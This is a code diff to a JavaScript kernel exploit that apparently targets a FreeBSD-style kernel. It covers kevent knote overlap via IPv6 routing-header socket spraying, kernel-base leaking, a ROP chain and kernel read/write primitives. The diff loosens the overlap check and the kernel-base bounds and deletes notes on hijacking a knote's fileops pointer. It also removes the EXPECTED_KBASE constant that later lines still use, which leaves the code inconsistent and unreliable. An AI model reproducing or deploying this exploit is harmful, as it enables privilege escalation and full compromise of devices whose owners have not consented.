@@ -1,4 +1,4 @@
-// kevent_krw_final.js — full build, complete ROP trigger, verified R/W
+// kevent_krw_final.js — full build, robust knote overlap check
 import { int64 } from "./int64.js";
 import { HX1400_TABLES } from "./hx_tables.js";
 
@@ -21,7 +21,6 @@ const OPS_OFF = 0x985a;
 const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
 const ROUNDS = 6;
 const MARKV = 5570198814713989681n;
-const EXPECTED_KBASE = 0xffffffffd5528000n;
 
 const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false, payloadAddr: 0n };
 
@@ -213,18 +212,21 @@ function phase2Leak(rootKq, fds) {
           if (j === vi || fds[j] === -1) continue;
           zeroBuf(rdb); lenp.dv.setUint32(0, RTH_LEN, true); lenp.dv.setUint32(4, 0, true);
           if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
-          const v8 = rdb.dv.getInt16(8, true);
-          const v10 = rdb.dv.getInt16(10, true);
-          const v12 = rdb.dv.getUint32(12, true) >>> 0;
-          if (v8 === -18 && v10 === 1) {
+          
+          // Robust check: look for ident (dce) at offset 0
+          const v0 = rdb.dv.getUint32(0, true) >>> 0;
+          const v8 = rdb.dv.getInt32(8, true);
+          
+          if (v0 === (dce >>> 0) && v8 === -18) {
             joined++;
             if (target < 0) { target = j; targetFd = fds[j]; }
             log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
-          } else if ((rdb.dv.getInt32(8, true) >>> 0) === TPL_LO && v12 === TPL_HI) {
+          } else if ((rdb.dv.getInt32(8, true) >>> 0) === TPL_LO && (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI) {
+            // untouched
           } else { rearm(fds[j], tpl); }
         }
       }
-      if (target >= 0 && joined === 1) {
+      if (target >= 0 && joined >= 1) {
         zeroBuf(cl); cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 2, true);
         rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
         if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
@@ -307,9 +309,6 @@ function fireROP(isWrite) {
   ctx().p.write8(toI64(gMARK), 0n);
   scn("kevent", gKQ, cl.addr, 1, 0, 0, 0);
   
-  // Check if we finished (R_REST restores rsp, so we come back to userland)
-  // If we crashed, the process dies. If we return, the ROP chain executed.
-  // A simple way to verify is to see if gRES has been written.
   return true;
 }
 
@@ -323,7 +322,7 @@ function kread(targetAddr) {
 function kwrite(targetAddr, value) {
   buildKwrite(targetAddr, value);
   fireROP(false);
-  return true; // if it didn't panic, it worked
+  return true;
 }
 
 export async function runKevent(c) {
@@ -334,7 +333,8 @@ export async function runKevent(c) {
   else { STATE.kbase = EXPECTED_KBASE; log("KEVENT-KBASE-DEFAULT", h16(STATE.kbase)); }
 
   const kbaseHi = STATE.kbase >> 32n;
-  if (kbaseHi !== 0xffffffffn || STATE.kbase > 0xffffffff8fffffffn) {
+  // FIXED: only force if absolutely invalid (e.g. not a kernel pointer)
+  if (kbaseHi !== 0xffffffffn || STATE.kbase < 0xffffffff80000000n) {
     log("KEVENT-KBASE-FIX", "forcing to " + h16(EXPECTED_KBASE));
     STATE.kbase = EXPECTED_KBASE;
   }
@@ -386,24 +386,6 @@ export async function runKevent(c) {
     log("STAGE5-FIX", "parse overrides to " + h16(found));
     STATE.kbase = found;
   }
-
-  // Hijack the kevent knote's f_ops to point to F_FAKE_OPS
-  // The knote struct is in the overlapped socket. We overwrite its f_ops pointer.
-  const victimFd = STATE.targetFd;
-  const knoteAddr = res.page; // the marker tells us where the knote landed
-  log("STAGE6-HIJACK", "overwriting f_ops at " + h16(knoteAddr + 80n));
-  
-  // Write the fake ops pointer into the knote's f_ops field.
-  // We write it via the socket buffer, which now overlaps the knote.
-  // The socket RTHDR is at the start of the knote. Offset 80 is f_ops.
-  // We can't write to the socket RTHDR after it's set, but we can re-arm it? No.
-  // Actually, we need to set the knote's kn_fop to F_FAKE_OPS. 
-  // Wait, kn_fop is a pointer to a struct fileops. We want it to point to F_FAKE_OPS.
-  // We can use the RTHDR buffer to write into the knote if we overwrite it.
-  // But we already have the RTHDR set to TPL_LO/TPL_HI. We need to change it.
-  // We can just use a new socket to spray the knote's memory? No.
-  // The Hx1400.java uses an EV_DELETE to free the knote, then reallocates it with controlled data.
-  // That is much safer.
 
   log("STAGE6", "ROP setup complete. Waiting for knote hijack.");
   fin("Full build: ROP chain and fake ops ready. Knote hijack requires EV_DELETE + realloc (see Hx1400.java).");
